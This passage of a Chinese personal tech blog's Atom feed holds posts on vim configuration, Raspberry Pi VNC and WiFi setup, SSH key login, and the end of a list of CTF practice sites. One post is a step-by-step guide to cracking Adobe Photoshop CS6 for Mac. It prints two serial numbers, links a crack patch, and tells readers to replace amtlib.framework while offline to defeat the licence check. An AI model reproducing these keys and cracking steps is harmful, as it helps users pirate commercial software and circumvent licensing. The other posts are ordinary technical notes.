href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h4><ul><li><a href="http://pwnhub.cn/" target="_blank" rel="noopener">PwnHub</a></li></ul><h4 id="Web攻防"><a href="#Web攻防" class="headerlink" title="Web攻防"></a>Web攻防</h4><h5 id="SQLi-注入"><a href="#SQLi-注入" class="headerlink" title="SQLi 注入"></a>SQLi 注入</h5><ul><li><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">SQLi-Labs</a></li><li><a href="http://redtiger.labs.overthewire.org/" target="_blank" rel="noopener">OverTheWire - SQLi</a></li></ul><h5 id="XSS-跨站攻击"><a href="#XSS-跨站攻击" class="headerlink" title="XSS 跨站攻击"></a>XSS 跨站攻击</h5><ul><li><a href="http://prompt.ml/0" target="_blank" rel="noopener">Prompt.ML</a></li><li><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">XSS Challenges</a></li><li><a href="https://alf.nu/alert1" target="_blank" rel="noopener">Alert(1) To Win</a></li><li><a href="https://github.com/evilcos/papers" target="_blank" rel="noopener">GitHub XSS Papers</a></li><li><a href="http://www.thespanner.co.uk/" target="_blank" rel="noopener">TheSpanner.co.uk</a></li><li><a href="http://xssor.io/" target="_blank" rel="noopener">XSS’OR</a></li><li><a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="noopener">Web-Security-Learning</a></li></ul><h4 id="Misc-脑洞"><a href="#Misc-脑洞" class="headerlink" title="Misc 脑洞"></a>Misc 脑洞</h4><ul><li><a href="http://www.ussrback.com/archives/Misc%20&amp;%20tools/" target="_blank" rel="noopener">Misc &amp; Tools</a></li></ul><h3 id="CTF-学习路线"><a href="#CTF-学习路线" class="headerlink" title="CTF 学习路线"></a>CTF 学习路线</h3><ul><li><a href="https://skills.bugbank.cn/" target="_blank" rel="noopener">漏洞银行技能树</a></li><li><a href="https://github.com/phith0n/Mind-Map" target="_blank" rel="noopener">GitHub 安全学习脑图</a></li><li><a href="http://evilcos.me/security_skill_tree_basic/index.html" target="_blank" rel="noopener">安全技能树简版</a></li><li><a href="http://blog.knownsec.com/Knownsec_RD_Checklist/index.html" target="_blank" rel="noopener">知道创宇技能树</a></li><li><a href="https://butian.360.cn/School/index" target="_blank" rel="noopener">360补天平台 - 白帽众学</a></li><li><a href="http://toutiao.secjia.com/ctf-game-experience" target="_blank" rel="noopener">CTF赛棍夺旗经验分享</a></li></ul><h3 id="CTF-刷题常用工具集"><a href="#CTF-刷题常用工具集" class="headerlink" title="CTF 刷题常用工具集"></a>CTF 刷题常用工具集</h3><ul><li><a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">CTF在线工具集(SSLEyes)</a></li><li><a href="http://tool.bugku.com/" target="_blank" rel="noopener">CTF在线工具集(BugKu)</a></li><li><a href="https://tools.pediy.com/" target="_blank" rel="noopener">看雪逆向工具</a></li><li><a href="https://www.ctftools.com/down/" target="_blank" rel="noopener">CTFTools</a></li><li><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">CTF Tools for Github</a></li><li><a href="http://www.s0ftpj.org/" target="_blank" rel="noopener">s0ftpj.org</a></li><li><a href="http://www.ussrback.com/files.html" target="_blank" rel="noopener">UssrBack</a></li><li><a href="https://www.soldierx.com/Tools" target="_blank" rel="noopener">Soldierx - Tools</a></li></ul>]]></content>
    
    <summary type="html">
    
      记录CTF相关的所有需要的信息，包括CTF训练平台，经验分享，在线与离线工具，资讯社区等  (长期更新)
    
    </summary>
    
      <category term="CTF竞赛" scheme="http://lfoder.github.io/categories/CTF%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="CTF" scheme="http://lfoder.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Adobe Photoshop CS6 for Mac (支持Retina屏) 官方简体破解版</title>
    <link href="http://lfoder.github.io/2018/05/19/Adobe-Photoshop-CS6-for-Mac-%E6%94%AF%E6%8C%81Retina%E5%B1%8F-%E5%AE%98%E6%96%B9%E7%AE%80%E4%BD%93%E7%A0%B4%E8%A7%A3%E7%89%88/"/>
    <id>http://lfoder.github.io/2018/05/19/Adobe-Photoshop-CS6-for-Mac-支持Retina屏-官方简体破解版/</id>
    <published>2018-05-19T14:19:25.000Z</published>
    <updated>2018-05-19T14:28:44.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Adobe PhotoShop CS6 for Mac特别说明</strong></p><p>1.如果想要Photoshop Extended 版本，你需要在替换amtlb.framework 之前先启动 PS 至少一次，然后退出，再替换破解版的amtlb.framework。</p><p>2.根据 Adobe 的 FAQ，Adobe cs6大师版的一些程序并不提供试用版，而是必须提供序列号才可启动程序的高级功能，因此需要填写序列号。</p><p>把这些需要序列号才能运行的程序还原回amtlib.framework 的原版；断网，启动程序，填入序列号，并选择“稍后连接”（<strong>序列号：1325-0949-2080-9819-3777-3230 或者1325-0160-5283-9851-2671-8951</strong>），退出，替换破解的 amtlib.framework；这类程序包括 distiller 和 aftereffects。</p><p><strong>Photoshop CS6破解补丁下载：</strong><a href="http://www.jb51.net/softs/135369.html" target="_blank" rel="noopener">www.jb51.net/softs/135369.html</a></p><p>详细的介绍不用多说了，相信大家都知道自己要下载的软件是什么，下面将为大家介绍一下安装与破解的方法：</p><p>1、安装前先断网</p><p>如果不断网的话还需要先申请一个Adobe ID，是免费申请</p><p>2、开始安装，选择“试用”，然后就开始安装了，一直等到安装完毕。</p><p><img src="http://files.jb51.net/file_images/article/201406/20140612102541111.png" alt=""></p><p>3、断网状态打开PS，（先联网还是会让输入ADOBE 的id和密码的）然后再联网，点击“帮助”，然后点“更新”，在线下载Retina补丁然后安装。</p><p>4、下载破解补丁，解开压缩。</p><p>5、在“应用程序”文件夹，找到Adobe Photoshop CS6文件夹,在里面找到Adobe Photoshop CS6.app，右键，选择“显示包内容”，如下图所示：</p><p><img src="http://files.jb51.net/file_images/article/201406/20140612102541112.jpg" alt=""></p><p>6、然后找到contents/framework文件夹，把刚才下载并解压的amtlib.framework拷贝进去，替换原文件。</p><p><img src="http://files.jb51.net/file_images/article/201406/20140612102541113.jpg" alt="img"></p><p>7、支持Retina屏的PHOTOSHOP CS6 MAC版破解就完成了。</p><p>如果提示关闭对8号字体和更小字体的文本平滑处理，请点击：系统偏好设置－通用。</p><p><img src="http://files.jb51.net/file_images/article/201406/20140612102541114.png" alt="img"></p><p>按上图设置就ok了。</p><p>到此就完成了，如下图：</p><p><img src="http://files.jb51.net/file_images/article/201406/20140612102541115.png" alt="img"></p><p>下载地址：</p><p><a href="https://pan.baidu.com/s/1qWnZaMw" target="_blank" rel="noopener">https://pan.baidu.com/s/1qWnZaMw</a></p>]]></content>
    
    <summary type="html">
    
      Adobe Photoshop CS6 for Mac (支持Retina屏) 官方简体破解版
    
    </summary>
    
    
      <category term="PhotoShop" scheme="http://lfoder.github.io/tags/PhotoShop/"/>
    
  </entry>
  
  <entry>
    <title>MacOS下vim爬坑笔记</title>
    <link href="http://lfoder.github.io/2018/05/16/MacOS%E4%B8%8Bvim%E7%88%AC%E5%9D%91%E7%AC%94%E8%AE%B0/"/>
    <id>http://lfoder.github.io/2018/05/16/MacOS下vim爬坑笔记/</id>
    <published>2018-05-16T03:04:43.000Z</published>
    <updated>2018-05-16T06:01:41.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MacOS下的VIM爬坑笔记"><a href="#MacOS下的VIM爬坑笔记" class="headerlink" title="MacOS下的VIM爬坑笔记"></a>MacOS下的VIM爬坑笔记</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install vim</span><br></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>MacOS下的vim配置文件 <code>vimrc</code> 在 <code>/usr/share/vim/vimrc</code> 这个位置。</p><p>以下是我的配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&quot; Configuration file for vim</span><br><span class="line">set modelines=0     &quot; CVE-2007-2438</span><br><span class="line"></span><br><span class="line">&quot; Normally we use vim-extensions. If you want true vi-compatibility</span><br><span class="line">&quot; remove change the following statements</span><br><span class="line">set nocompatible    &quot; Use Vim defaults instead of 100% vi compatibility</span><br><span class="line">set backspace=2     &quot; more powerful backspacing</span><br><span class="line"></span><br><span class="line">&quot; Don&apos;t write backup file if vim is being called by &quot;crontab -e&quot;</span><br><span class="line">au BufWrite /private/tmp/crontab.* set nowritebackup nobackup</span><br><span class="line">&quot; Don&apos;t write backup file if vim is being called by &quot;chpass&quot;</span><br><span class="line">au BufWrite /private/etc/pw.* set nowritebackup nobackup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot; Custom Configure Start</span><br><span class="line"></span><br><span class="line">&quot; 自动检测语法高亮</span><br><span class="line">syntax on</span><br><span class="line">&quot; Tab替换为4个空格</span><br><span class="line">set ts=4</span><br><span class="line">set expandtab</span><br><span class="line">&quot; 搜索结果高亮 (取消方法  :nohls)</span><br><span class="line">set hlsearch</span><br><span class="line"></span><br><span class="line">&quot; Custom Configure End</span><br></pre></td></tr></table></figure><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><h4 id="安装插件管理器"><a href="#安装插件管理器" class="headerlink" title="安装插件管理器"></a>安装插件管理器</h4><p>vim插件管理工具可以让插件安装变得简单快捷，vim的插件管理工具也有很多，这里选用 <a href="https://github.com/tpope/vim-pathogen" target="_blank" rel="noopener">vim-pathogen</a> （<a href="https://github.com/tpope/vim-pathogen" target="_blank" rel="noopener">https://github.com/tpope/vim-pathogen</a>），安装很简单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/.vim/autoload ~/.vim/bundle</span><br></pre></td></tr></table></figure><p>下载 vim-pathogen 到 ~/.vim/autoload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -LSso ~/.vim/autoload/pathogen.vim https://tpo.pe/pathogen.vim</span><br></pre></td></tr></table></figure><p>编辑  <code>/usr/share/vim/vimrc</code>  ，加入如下几行内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execute pathogen#infect()</span><br><span class="line">syntax on</span><br><span class="line">filetype plugin indent on</span><br></pre></td></tr></table></figure><p>重启vim 即可安装成功，之后如果想要安装其他插件，只需把插件放到 ~/.vim/bundle 目录下， 重启vim ，vim-pathogen就会帮你自动安装好插件。例如安装</p><p>markdown：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.vim/bundle/</span><br><span class="line">git clone https://github.com/plasticboy/vim-markdown.git</span><br></pre></td></tr></table></figure><p>然后重启vim即可</p><h4 id="添加-vim-go-插件"><a href="#添加-vim-go-插件" class="headerlink" title="添加 vim-go 插件"></a>添加 vim-go 插件</h4><p>vim-go 是一款go代码高亮和语法检查的插件</p><p>如上所示安装方法，clone vim-go 到 ~/.vim/bundle 目录下即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.vim/bundle/</span><br><span class="line">git clone https://github.com/fatih/vim-go.git</span><br></pre></td></tr></table></figure><p>Via:<a href="https://blog.csdn.net/zhang197093/article/details/78559903?locationNum=5&amp;fps=1" target="_blank" rel="noopener">https://blog.csdn.net/zhang197093/article/details/78559903?locationNum=5&amp;fps=1</a></p><blockquote><p>启动vim出现错误：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim-go requires Vim 7.4.1689 or Neovim, but you&apos;re using an older version.</span><br><span class="line">Please update your Vim for the best vim-go experience.</span><br><span class="line">If you really want to continue you can set this to make the error go away:</span><br><span class="line">    let g:go_version_warning = 0</span><br><span class="line">Note that some features may error out or behave incorrectly.</span><br><span class="line">Please do not report bugs unless you&apos;re using Vim 7.4.1689 or newer.</span><br><span class="line"></span><br><span class="line">Press ENTER or type command to continue</span><br></pre></td></tr></table></figure><blockquote><p>解决方案：</p></blockquote><p>添加 <code>let g:go_version_warning = 0</code> 到 vimrc文件中。</p>]]></content>
    
    <summary type="html">
    
      针对MacOS系统的vim安装、配置、优化、插件管理、可视化编程等...
    
    </summary>
    
    
      <category term="MacOS" scheme="http://lfoder.github.io/tags/MacOS/"/>
    
      <category term="vim" scheme="http://lfoder.github.io/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>树莓派配置配置VNC服务并开机启动</title>
    <link href="http://lfoder.github.io/2018/05/12/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%85%8D%E7%BD%AE%E9%85%8D%E7%BD%AEVNC%E6%9C%8D%E5%8A%A1%E5%B9%B6%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/"/>
    <id>http://lfoder.github.io/2018/05/12/树莓派配置配置VNC服务并开机启动/</id>
    <published>2018-05-12T09:39:20.000Z</published>
    <updated>2018-05-12T09:54:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>首先进入SSH进入树莓派系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo raspi-config</span><br></pre></td></tr></table></figure><p>进入树莓派配置页面</p><p>选择 第5项  <strong>5 Interfacing Options</strong>，回车进入</p><p>然后选择第3项 <strong>P3 VNC</strong>， 回车进入，选择 <code>yes</code></p><p>然后Finish  重启树莓派 SSH 登录。</p><p>开始配置树莓派VNC服务启动脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/init.d/vncserver</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">### BEGIN INIT INFO</span><br><span class="line"># Provides:          vncserver</span><br><span class="line"># Required-Start:    $local_fs</span><br><span class="line"># Required-Stop:     $local_fs</span><br><span class="line"># Default-Start:     2 3 4 5</span><br><span class="line"># Default-Stop:      0 1 6</span><br><span class="line"># Short-Description: Start/stop vncserver</span><br><span class="line">### END INIT INFO</span><br><span class="line"> </span><br><span class="line"># More details see:</span><br><span class="line"># http://www.penguintutor.com/linux/vnc</span><br><span class="line"> </span><br><span class="line">### Customize this entry</span><br><span class="line"># Set the USER variable to the name of the user to start vncserver under</span><br><span class="line">export USER=&apos;pi&apos;</span><br><span class="line">### End customization required</span><br><span class="line"> </span><br><span class="line">eval cd ~$USER</span><br><span class="line"> </span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">  start)</span><br><span class="line">    # 启动命令行。此处自定义分辨率、控制台号码或其它参数。</span><br><span class="line">    su $USER -c &apos;/usr/bin/vncserver -depth 16 -geometry 1024x768 :1&apos;</span><br><span class="line">    echo &quot;Starting VNC server for $USER &quot;</span><br><span class="line">    ;;</span><br><span class="line">  stop)</span><br><span class="line">    # 终止命令行。此处控制台号码与启动一致。</span><br><span class="line">    su $USER -c &apos;/usr/bin/vncserver -kill :1&apos;</span><br><span class="line">    echo &quot;vncserver stopped&quot;</span><br><span class="line">    ;;</span><br><span class="line">  *)</span><br><span class="line">    echo &quot;Usage: /etc/init.d/vncserver &#123;start|stop&#125;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><p>写入以上内容，保存退出。</p><p>然后 修改权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 755 /etc/init.d/vncserver</span><br></pre></td></tr></table></figure><p>然后 添加开机启动项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-rc.d vncserver defaults</span><br></pre></td></tr></table></figure><p>最后 重启树莓派</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      树莓派配置VNC服务并开机启动
    
    </summary>
    
      <category term="Raspberry Pi 笔记" scheme="http://lfoder.github.io/categories/Raspberry-Pi-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="树莓派" scheme="http://lfoder.github.io/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
    
      <category term="Raspberry Pi" scheme="http://lfoder.github.io/tags/Raspberry-Pi/"/>
    
  </entry>
  
  <entry>
    <title>SSH无密码登录 - authorized_keys认证登录</title>
    <link href="http://lfoder.github.io/2018/05/12/SSH%E6%97%A0%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95-authorized-keys%E8%AE%A4%E8%AF%81%E7%99%BB%E5%BD%95/"/>
    <id>http://lfoder.github.io/2018/05/12/SSH无密码登录-authorized-keys认证登录/</id>
    <published>2018-05-12T09:24:56.000Z</published>
    <updated>2018-05-12T09:30:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>1、ssh-keygen做密码验证可以使在向对方机器上ssh ,scp不用使用密码.具体方法如下:<br>2、两个节点都执行操作：</p><p><strong>#ssh-keygen -t rsa</strong><br> 然后全部回车,采用默认值.<br>3、这样生成了一对密钥，存放在用户目录的~/.ssh下。<br><strong>将公钥考到对方机器的用户目录下</strong>，并将其复制到~/.ssh/authorized_keys中（操作命令：<strong>#cat id_dsa.pub &gt;&gt; ~/.ssh/authorized_keys</strong>）。</p><p>4、设置文件和目录权限：</p><p>设置authorized_keys权限<br>$ chmod 600 authorized_keys<br>设置.ssh目录权限<br>$ chmod 700 -R .ssh</p><p> 5、要保证.ssh和authorized_keys都只有用户自己有写权限。否则验证无效。（今天就是遇到这个问题，找了好久问题所在），其实仔细想想，这样做是为了不会出现系统漏洞。</p><blockquote><p>资源来自：<a href="https://blog.csdn.net/xiaoyida11/article/details/51557174" target="_blank" rel="noopener">https://blog.csdn.net/xiaoyida11/article/details/51557174</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      SSH添加公钥到authorized_keys实现无密码登录
    
    </summary>
    
      <category term="Linux 笔记" scheme="http://lfoder.github.io/categories/Linux-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Linux" scheme="http://lfoder.github.io/tags/Linux/"/>
    
      <category term="SSH证书登录" scheme="http://lfoder.github.io/tags/SSH%E8%AF%81%E4%B9%A6%E7%99%BB%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>树莓派系统的安装与配置</title>
    <link href="http://lfoder.github.io/2018/05/12/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
    <id>http://lfoder.github.io/2018/05/12/树莓派系统的安装与配置/</id>
    <published>2018-05-12T07:56:08.000Z</published>
    <updated>2018-05-12T08:58:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="树莓派系统的安装与配置"><a href="#树莓派系统的安装与配置" class="headerlink" title="树莓派系统的安装与配置"></a>树莓派系统的安装与配置</h3><h4 id="下载-Raspberry-Pi-系统"><a href="#下载-Raspberry-Pi-系统" class="headerlink" title="下载 Raspberry Pi 系统"></a>下载 Raspberry Pi 系统</h4><p><a href="https://www.raspberrypi.org/downloads/" target="_blank" rel="noopener">https://www.raspberrypi.org/downloads/</a></p><p>下载完成后是一个zip压缩文件，解压出来成为一个拓展名为 <code>.img</code>  的文件</p><h4 id="烧写树莓派系统到内存卡"><a href="#烧写树莓派系统到内存卡" class="headerlink" title="烧写树莓派系统到内存卡"></a>烧写树莓派系统到内存卡</h4><p>首先你需要一个读卡器，很庆幸翻箱倒柜找到一枚N年前还是USB2.0的读卡器，谢天谢地。</p><p>然后我的测试环境是 <code>MacOS</code> ，使用的烧录软件是 <code>Etcher</code> ，这是一个烧写磁盘镜像的工具，Windows上有很多烧写磁盘的工具，具体自己找吧…   都有异曲同工之妙。</p><p>步骤很简单，界面如下：</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fr8mnbp8akj318g0l40sw.jpg" alt=""></p><p>左边一个 选择好你刚才下载解压出来的img镜像文件，中间一个选择你要烧写的目标磁盘或内存卡 (默认会自动选择可移动磁盘或内存卡，不会选择系统磁盘，可放心使用)， 第三个<code>Flash！</code> 就是烧写操作，前两项选择完毕以后第三项<code>Flash！</code>以后就开始烧写了。</p><p>首先<strong>烧写之前</strong>右上角设置小齿轮里最好关掉所有选择项，慢慢你就懂了… </p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fr8msj6141j318g0l40t3.jpg" alt=""></p><p>然后根据上面的步骤开始烧写磁盘。</p><p>烧写完毕。树莓派系统就已经做好了。此时还没有结束。</p><h4 id="树莓派开机自动启动SSH服务"><a href="#树莓派开机自动启动SSH服务" class="headerlink" title="树莓派开机自动启动SSH服务"></a>树莓派开机自动启动SSH服务</h4><p>在树莓派系统的内存卡根目录中，创建一个名为 <code>ssh</code>  的空文件，这样做的目的是为了在树莓派系统启动时自动启动 ssh 服务，插上网线，重启之。</p><p>用自己的电脑执行 <code>sudo nmap -sn 192.168.1.1/24</code>  扫描树莓派所在的网段，我是在MacOS下执行的，得加sudo，执行结果如下：</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">lfoder in ~ λ sudo nmap -sn 192.168.1.1/24</span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-12 16:57 CST</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.0045s latency).</span><br><span class="line">MAC Address: 我是马赛克 (Sichuan Tianyi Comheart Telecomco.)</span><br><span class="line">Nmap scan report for 192.168.1.2</span><br><span class="line">Host is up (0.021s latency).</span><br><span class="line">MAC Address: 我是马赛克 (Apple)</span><br><span class="line">Nmap scan report for 192.168.1.4</span><br><span class="line">Host is up (0.027s latency).</span><br><span class="line">MAC Address: 我是马赛克 (Ampak Technology)</span><br><span class="line">Nmap scan report for 192.168.1.6</span><br><span class="line">Host is up (0.0062s latency).</span><br><span class="line">MAC Address: 我是马赛克 (Raspberry Pi Foundation)</span><br><span class="line">Nmap scan report for 192.168.1.11</span><br><span class="line">Host is up (0.0067s latency).</span><br><span class="line">MAC Address: 我是马赛克 (Huawei Technologies)</span><br><span class="line">Nmap scan report for 192.168.1.5</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (6 hosts up) scanned in 4.58 seconds</span><br><span class="line">lfoder in ~ λ</span><br></pre></td></tr></table></figure><p>   可以看到 <code>Raspberry Pi Foundation</code> ，得知树莓派的IP是 <code>192.168.1.6</code>，然后<code>ssh pi@192.168.1.6</code>登陆之( 默认pi账户的密码是raspberry )，成功从U盘启动树莓派官方系统。</p><h4 id="树莓派开机自动连接WiFi"><a href="#树莓派开机自动连接WiFi" class="headerlink" title="树莓派开机自动连接WiFi"></a>树莓派开机自动连接WiFi</h4><p>将你的wifi 通过以下格式 改写成一个 名为 <code>wpa_supplicant.conf</code> 存放在树莓派系统所在内存卡的根目录下 (unix系统看到的是在挂载的内存卡磁盘上的 /boot 目录下)，</p><p>内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">country=CN</span><br><span class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class="line">update_config=1</span><br><span class="line"> </span><br><span class="line">network=&#123;</span><br><span class="line">ssid=&quot;我是wifi名字&quot;</span><br><span class="line">psk=&quot;woshiwifimima&quot;</span><br><span class="line">key_mgmt=WPA-PSK</span><br><span class="line">priority=1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">network=&#123;</span><br><span class="line">ssid=&quot;WiFi-A&quot;</span><br><span class="line">psk=&quot;12345678&quot;</span><br><span class="line">key_mgmt=WPA-PSK</span><br><span class="line">priority=2</span><br><span class="line">scan_ssid=1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">network=&#123;</span><br><span class="line">ssid=&quot;WiFi-B&quot;</span><br><span class="line">psk=&quot;12345678&quot;</span><br><span class="line">key_mgmt=WPA-PSK</span><br><span class="line">priority=3</span><br><span class="line">scan_ssid=1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>network 里面的ssid是wifi的名字，psk 是wifi密码，填好后保存重启 ，树莓派将会根据优先级自动连上wifi。</p><h3 id="低电压错误处理"><a href="#低电压错误处理" class="headerlink" title="低电压错误处理"></a>低电压错误处理</h3><blockquote><p>至此 ，树莓派接上HDMI线后连接电视会出现以下错误提示信息</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Under-voltage detected! (0x00050005)</span><br></pre></td></tr></table></figure><p>期间右上角还会出现黄色的小闪电，偶尔会开机黑屏，系统都进不去…  这是电压检测不通过。</p><p>状况概览：</p><p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fr8njfc9jkj31kw16o0wy.jpg" alt=""></p><p>然后黑屏，至少我的状况是这样的..  </p><blockquote><p>解决方法：</p></blockquote><p>编辑 内存卡根目录 (unix系统打开是在挂载磁盘的 /boot 目录下) 找到 <code>config.txt</code></p><p>vim编辑此文件，追加以下信息到结尾：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Disable under-voltage warning</span><br><span class="line">avoid_warnings=1</span><br></pre></td></tr></table></figure><p>保存退出 ，重启树莓派，错误提示消失并成功开机。</p><blockquote><p>参考资料:</p></blockquote><p><a href="https://scribles.net/lightning-bolt-under-voltage-warning-on-raspberry-pi" target="_blank" rel="noopener">https://scribles.net/lightning-bolt-under-voltage-warning-on-raspberry-pi</a></p><p><a href="https://retropie.org.uk/forum/topic/1006/under-voltage-on-the-pi3" target="_blank" rel="noopener">https://retropie.org.uk/forum/topic/1006/under-voltage-on-the-pi3</a></p><p><a href="https://github.com/raspberrypi/linux/issues/2512" target="_blank" rel="noopener">https://github.com/raspberrypi/linux/issues/2512</a></p><p>这里还有一篇关于树莓派电压不足的文章，推荐使用 5V 2A 的电源。</p><p><a href="http://bbs.elecfans.com/jishu_450017_1_1.html" target="_blank" rel="noopener">http://bbs.elecfans.com/jishu_450017_1_1.html</a></p>]]></content>
    
    <summary type="html">
    
      树莓派安装系统与配置SSH并正常使用
    
    </summary>
    
      <category term="Raspberry Pi 笔记" scheme="http://lfoder.github.io/categories/Raspberry-Pi-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="树莓派" scheme="http://lfoder.github.io/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
    
      <category term="Raspberry Pi" scheme="http://lfoder.github.io/tags/Raspberry-Pi/"/>
    
  </entry>
  
  <entry>
    <title>树莓派下使用dd克隆系统</title>
